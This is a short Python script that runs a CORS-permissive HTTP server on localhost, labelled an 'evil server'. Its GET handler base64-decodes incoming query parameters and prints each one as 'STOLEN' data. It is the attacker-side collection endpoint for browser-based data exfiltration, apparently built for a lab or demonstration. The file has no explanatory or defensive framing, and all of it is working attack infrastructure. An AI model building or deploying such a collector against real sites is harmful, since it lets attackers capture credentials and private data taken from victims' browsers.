# cors_server.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import base64

class CORSRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        super().end_headers()
    
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.query:
            # Decode and print stolen data
            params = parse_qs(parsed.query)
            for key, value in params.items():
                try:
                    decoded = base64.b64decode(value[0]).decode('utf-8')
                    print(f"🚨 STOLEN {key.upper()}: {decoded}")
                except:
                    print(f"🚨 STOLEN {key.upper()}: {value[0]}")
        super().do_GET()

if __name__ == '__main__':
    server = HTTPServer(('127.0.0.1', 8001), CORSRequestHandler)
    print("Evil server running on http://127.0.0.1:8001")
    server.serve_forever()
